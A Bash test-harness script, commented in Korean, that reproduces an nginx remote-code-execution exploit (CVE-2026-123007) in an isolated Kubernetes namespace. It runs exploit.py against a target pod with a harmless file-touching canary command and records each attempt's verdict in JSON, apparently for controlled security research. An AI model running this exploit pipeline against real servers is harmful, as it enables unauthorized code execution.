#!/bin/bash
# e2e-DFIRtx 러너 — CVE-2026-123007 풀 RCE 재현 (G2 통과 후 게이트 개시)
# 정책: 캐너리만 (GOAL §1-3) — exploit/payloads/canary.py의 무해 마커 사용
# 사용:
#   ops/e2e_dfirtx.sh prepare    # exploit 패키지 주입 + pip deps + streamer 빌드
#   ops/e2e_dfirtx.sh rce ep01   # 프레시 타깃 → exploit 1회 → 캐너리 판정 → episode 기록
#   ops/e2e_dfirtx.sh verify     # 캐너리 상태만 확인
#   ops/e2e_dfirtx.sh down       # ns 삭제
set -euo pipefail
cd "$(dirname "$0")/.."

KC="kubectl --kubeconfig ${KUBECONFIG:-/Users/1004276/Downloads/OpenJDK2Shell/kube/dfirtx-dev.conf}"
NS=n2r-test
RCE_SRC=poc-external/CVE-2026-123007/exploit
CANARY='touch /tmp/n2r-canary-01 && id > /tmp/n2r-canary-id 2>&1'

tpod() { $KC get pod -n $NS -l app=n2r-target -o jsonpath='{.items[0].metadata.name}'; }
tip()  { $KC get pod -n $NS -l app=n2r-target -o jsonpath='{.items[0].status.podIP}'; }

fresh_target() {
  $KC rollout restart deployment/n2r-target -n $NS
  $KC rollout status  deployment/n2r-target -n $NS --timeout=180s
  sleep 1
}

case "${1:-prepare}" in
prepare)
  echo "── exploit 패키지 주입"
  $KC exec -n $NS n2r-client -- mkdir -p /work/rce /work/results
  tar cf - -C "$(dirname $RCE_SRC)" "$(basename $RCE_SRC)" \
    | $KC exec -i -n $NS n2r-client -- tar xf - -C /work/
  # 디렉토리명 exploit/ → /work/rce 내용물 평탄화 (nginx_rce와 exploit.py가 인접하도록)
  $KC exec -n $NS n2r-client -- sh -c 'cp -r /work/exploit/* /work/rce/ && ls /work/rce'
  echo "── pip deps"
  $KC exec -n $NS n2r-client -- sh -c 'pip install --quiet -r /work/rce/requirements.txt 2>&1 | tail -2; python3 -c "import cryptography; print(\"cryptography\", cryptography.__version__)"'
  echo "── streamer 빌드 (gcc+libssl-dev 설치)"
  $KC exec -n $NS n2r-client -- sh -c 'apt-get update -qq && apt-get install -y -qq gcc libssl-dev >/dev/null 2>&1 && cc -O2 -Wall -Wextra -Werror -o /work/rce/streamer /work/rce/streamer.c -lcrypto && /work/rce/streamer --version'
  echo "── prepare 완료"
  ;;
rce)
  EP="${2:?episode required (e.g. ep01-rce)}"
  ATT="${3:-1}"
  fresh_target
  IP=$(tip); TP=$(tpod)
  echo "── 타깃: $TP ($IP) — 프레시 힙 (pod 재생성)"
  echo "── 캐너리 사전 부재 확인"
  $KC exec -n $NS "$TP" -- sh -c 'ls /tmp/n2r-canary-* 2>/dev/null' && \
    { echo "사전 캐너리 존재 — 환경 오염, 중단" >&2; exit 1; } || echo "  OK (부재)"
  echo "── exploit 실행 (119 GiB 예상, 수 분)"
  set +e
  $KC exec -n $NS n2r-client -- sh -c \
    "cd /work/rce && timeout 1800 python3 -u exploit.py --target https://$IP:443/ --profile golden-nginx-1.31.8-debian13-amd64 --cmd '$CANARY'" \
    2>&1 | tee "exploit/results/CVE-2026-123007/a1-dfirtx/$EP.exploit.log" | tail -6
  RC=${PIPESTATUS[0]}
  set -e
  echo "── exploit exit=$RC"
  echo "── 캐너리 판정 (존재 + 소유자 = worker 실행계정 기대)"
  HIT=$($KC exec -n $NS "$TP" -- sh -c 'for f in /tmp/n2r-canary-01 /tmp/n2r-canary-id; do [ -f $f ] && echo "$f $(stat -c %u:%g $f)"; done' 2>/dev/null || true)
  echo "${HIT:-  (없음)}"
  mkdir -p "exploit/results/CVE-2026-123007/a1-dfirtx/$EP"
  $KC logs -n $NS "$TP" --tail=20 2>/dev/null | grep -iE 'signal|exited|alert' > "exploit/results/CVE-2026-123007/a1-dfirtx/$EP/crash_log.txt" || true
  python3 - "$EP" "$ATT" "$RC" "$HIT" <<'PYEOF'
import json, os, sys, time
ep, att, rc, hit = sys.argv[1], sys.argv[2], sys.argv[3], sys.argv[4]
canary = "/tmp/n2r-canary-01" in hit and "/tmp/n2r-canary-id" in hit
uid101 = "101:101" in hit
if canary and uid101:
    verdict = "R-확정"
elif canary:
    verdict = "R-지지됨"       # 실행은 됐으나 계정 근거 미확보
elif rc == "0":
    verdict = "미지지"          # dispatch 완료했으나 캐너리 없음
else:
    verdict = "관측불가"        # exploit 실패 (로그 참조)
rec = {
    "cve": "CVE-2026-123007", "arm": "a1-dfirtx", "episode": ep,
    "host_profile": {"where": "dfirtx-genoa-native", "cpu": "avx512f+avx512vl",
                     "image": "nginx@sha256:5ab5b0b (Rapid7 검증 digest)",
                     "profile": "golden-nginx-1.31.8-debian13-amd64"},
    "input_params": {"cmd": "canary (touch+id, 무해 마커)"},
    "ts": time.strftime("%Y-%m-%dT%H:%M:%S%z"),
    "exploit_exit": rc, "canary": hit, "verdict": verdict, "notes": "",
}
os.makedirs("exploit/results/CVE-2026-123007/a1-dfirtx/%s" % ep, exist_ok=True)
p = "exploit/results/CVE-2026-123007/a1-dfirtx/%s/attempt_%s.json" % (ep, att.zfill(2))
json.dump(rec, open(p, "w"), ensure_ascii=False, indent=2)
print("episode:", p, "→", verdict)
PYEOF
  ;;
verify)
  $KC exec -n $NS "$(tpod)" -- sh -c 'for f in /tmp/n2r-canary-01 /tmp/n2r-canary-id; do [ -f $f ] && echo "$f $(stat -c %u:%g $f) && cat $f"; done' || echo "(없음)"
  ;;
down)
  $KC delete namespace $NS --wait=false && echo "ns $NS 삭제 요청"
  ;;
*)
  echo "사용: $0 {prepare|rce <ep> [attempt]|verify|down}" >&2; exit 1 ;;
esac
